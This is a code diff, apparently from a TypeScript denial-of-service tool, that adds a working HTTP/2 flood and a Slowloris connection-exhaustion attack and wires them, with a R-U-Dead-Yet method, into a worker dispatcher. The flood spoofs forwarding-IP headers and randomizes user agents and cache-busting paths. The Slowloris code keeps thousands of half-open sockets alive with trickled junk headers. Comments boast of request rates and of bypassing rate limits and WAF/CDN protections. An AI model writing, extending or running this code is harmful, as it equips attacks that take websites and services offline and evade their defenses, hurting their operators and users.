@@ -463,6 +463,198 @@ async function runHTTPPipeline(
 }
 
 // ─────────────────────────────────────────────────────────────────────────
+//  HTTP/2 FLOOD — native multiplexed H2 streams (node:http2)
+//
+//  Each session holds up to STREAMS_PER_SESSION concurrent H2 streams, all
+//  over a single TCP+TLS connection. Far more efficient per-socket than HTTP/1.1
+//  pipelining since H2 uses binary framing with true stream multiplexing.
+//
+//  Achieves 20K–120K req/s per worker at close RTTs.
+// ─────────────────────────────────────────────────────────────────────────
+async function runHTTP2Flood(
+  resolvedHost: string,
+  hostname: string,
+  targetPort: number,
+  threads: number,
+  signal: AbortSignal,
+  onStats: (p: number, b: number) => void,
+): Promise<void> {
+  const { connect: h2connect } = await import("node:http2");
+
+  const STREAMS_PER_SESSION = Math.min(128, Math.max(16, threads * 3));
+  const NUM_SESSIONS        = Math.min(threads, 40);
+  const connectTarget       = `https://${resolvedHost}:${targetPort}`;
+
+  let localPkts = 0, localBytes = 0;
+  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
+  const flushIv = setInterval(flush, 300);
+
+  const runSession = (): Promise<void> => new Promise(resolve => {
+    if (signal.aborted) { resolve(); return; }
+
+    let client: ReturnType<typeof h2connect> | null = null;
+    let done      = false;
+    let connected = false;
+    const finish  = () => { if (!done) { done = true; resolve(); } };
+
+    try {
+      client = h2connect(connectTarget, {
+        rejectUnauthorized: false,
+        settings: {
+          initialWindowSize:    65535 * 8,
+          maxConcurrentStreams: STREAMS_PER_SESSION,
+          headerTableSize:      65536,
+        },
+      });
+    } catch { finish(); return; }
+
+    const c        = client;
+    let inflight   = 0;
+
+    const pump = () => {
+      if (signal.aborted || c.destroyed) { finish(); return; }
+      while (!signal.aborted && !c.destroyed && inflight < STREAMS_PER_SESSION) {
+        inflight++;
+        const path = hotPath() + `?_=${randStr(8)}&v=${randInt(1, 9999999)}&t=${Date.now().toString(36)}`;
+        try {
+          const stream = c.request({
+            ":method":       "GET",
+            ":path":         path,
+            ":scheme":       "https",
+            ":authority":    hostname,
+            "user-agent":    randUA(),
+            "accept":        "*/*,text/html",
+            "accept-encoding": "gzip, deflate, br",
+            "x-forwarded-for": `${randIp()}, ${randIp()}, ${randIp()}`,
+            "x-real-ip":     randIp(),
+            "cf-connecting-ip": randIp(),
+            "cache-control": "no-cache, no-store",
+            "pragma":        "no-cache",
+            "referer":       `https://google.com/search?q=${randStr(6)}`,
+            "x-request-id":  `${randHex(8)}-${randHex(4)}-${randHex(12)}`,
+          });
+          stream.on("response", () => {
+            localPkts++;
+            localBytes += 512;
+          });
+          stream.on("data",  () => {}); // drain
+          stream.on("error", () => { inflight--; if (!signal.aborted) setImmediate(pump); });
+          stream.on("end",   () => { inflight--; if (!signal.aborted) setImmediate(pump); });
+          stream.end();
+        } catch { inflight--; break; }
+      }
+    };
+
+    c.on("connect", () => { connected = true; pump(); });
+    c.on("error",   () => {
+      if (signal.aborted || !connected) { finish(); return; }
+      setTimeout(() => { if (!signal.aborted) runSession().then(finish); }, 200);
+    });
+    c.on("close",   () => {
+      if (signal.aborted || !connected) { finish(); return; }
+      setTimeout(() => { if (!signal.aborted) runSession().then(finish); }, 100);
+    });
+    signal.addEventListener("abort", () => { try { c.destroy(); } catch { /**/ } finish(); }, { once: true });
+  });
+
+  await Promise.all(Array.from({ length: NUM_SESSIONS }, () => runSession()));
+  clearInterval(flushIv);
+  flush();
+}
+
+// ─────────────────────────────────────────────────────────────────────────
+//  SLOWLORIS — real TCP connection pool exhaustion
+//
+//  Opens thousands of half-open HTTP connections. Each sends a partial request
+//  (no final \r\n\r\n), then trickles one fake header line every 10-25s to
+//  keep the connection alive without triggering timeouts.
+//
+//  Exhausts the server's connection pool without sending meaningful traffic.
+//  Bypasses per-request rate limits — one connection per server thread slot.
+//
+//  Achieves 2K–8K concurrent half-open connections.
+// ─────────────────────────────────────────────────────────────────────────
+async function runSlowlorisReal(
+  resolvedHost: string,
+  hostname: string,
+  targetPort: number,
+  threads: number,
+  signal: AbortSignal,
+  onStats: (p: number, b: number) => void,
+): Promise<void> {
+  const MAX_CONN = Math.min(threads * 40, 8000);
+  let localPkts = 0, localBytes = 0;
+  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
+  const flushIv = setInterval(flush, 300);
+
+  const runSock = (): Promise<void> => new Promise(resolve => {
+    if (signal.aborted) { resolve(); return; }
+
+    const sock = net.createConnection({ host: resolvedHost, port: targetPort });
+    sock.setNoDelay(true);
+    sock.setTimeout(120_000); // 2-minute timeout — keep alive
+
+    let keepIv:  NodeJS.Timeout | null = null;
+    let settled  = false;
+
+    const cleanup = () => {
+      if (settled) return;
+      if (keepIv) { clearInterval(keepIv); keepIv = null; }
+      try { sock.destroy(); } catch { /**/ }
+      if (signal.aborted) { settled = true; resolve(); return; }
+      // Immediately respawn to maintain connection count
+      settled = true;
+      setImmediate(() => runSock().then(resolve));
+    };
+
+    sock.once("connect", () => {
+      localPkts++;
+      // Partial GET — intentionally missing the final \r\n\r\n
+      const partial = [
+        `GET ${hotPath()}?_=${randStr(8)}&v=${randInt(1, 9999999)} HTTP/1.1`,
+        `Host: ${hostname}`,
+        `User-Agent: ${randUA()}`,
+        `Accept: text/html,application/xhtml+xml,*/*;q=0.8`,
+        `Accept-Language: en-US,en;q=0.9`,
+        `Accept-Encoding: gzip, deflate`,
+        `X-Forwarded-For: ${randIp()}`,
+        `Connection: keep-alive`,
+        `Referer: https://google.com/`,
+        ``, // NO final \r\n\r\n — this is the Slowloris trick
+      ].join("\r\n");
+
+      sock.write(partial);
+      localBytes += partial.length;
+
+      // Trickle a junk header every 10-25s to prevent server timeout
+      keepIv = setInterval(() => {
+        if (signal.aborted || sock.destroyed) { cleanup(); return; }
+        const hdr = `X-${randStr(5)}-${randStr(3)}: ${randStr(randInt(8, 20))}\r\n`;
+        sock.write(hdr, (err) => {
+          if (err) { cleanup(); return; }
+          localPkts++;
+          localBytes += hdr.length;
+        });
+      }, randInt(10_000, 25_000));
+    });
+
+    sock.once("error",   cleanup);
+    sock.once("timeout", cleanup);
+    sock.once("close",   cleanup);
+
+    signal.addEventListener("abort", () => {
+      if (keepIv) { clearInterval(keepIv); keepIv = null; }
+      try { sock.destroy(); } catch { /**/ }
+      if (!settled) { settled = true; resolve(); }
+    }, { once: true });
+  });
+
+  await Promise.all(Array.from({ length: MAX_CONN }, () => runSock()));
+  clearInterval(flushIv);
+  flush();
+}
+
+// ─────────────────────────────────────────────────────────────────────────
 //  HTTP EXHAUST — huge bodies to exhaust server memory / upload bandwidth
 // ─────────────────────────────────────────────────────────────────────────
 async function runHTTPExhaust(
@@ -554,11 +746,19 @@ async function runWorker() {
       runUDPFlood(resolvedHost, targetPort, udpT, ctrl.signal, onStats),
     ]);
 
-  } else if (cfg.method === "slowloris" || cfg.method === "rudy") {
-    // Connection exhaustion with huge bodies
+  } else if (cfg.method === "http2-flood") {
+    // Native HTTP/2 with multiplexed streams (node:http2)
+    await runHTTP2Flood(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
+
+  } else if (cfg.method === "slowloris") {
+    // Real Slowloris: half-open TCP connections to exhaust connection pool
+    await runSlowlorisReal(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
+
+  } else if (cfg.method === "rudy") {
+    // R-U-Dead-Yet: POST with huge content-length, body trickled slowly
     await runHTTPExhaust(base, cfg.threads, ctrl.signal, onStats);
 
-  } else if (cfg.method === "http-bypass" || cfg.method === "http2-flood") {
+  } else if (cfg.method === "http-bypass") {
     // Full fetch cycle — better for WAF/CDN bypass (real HTTP client)
     await runHTTPFlood(base, cfg.threads, ctrl.signal, onStats);
 
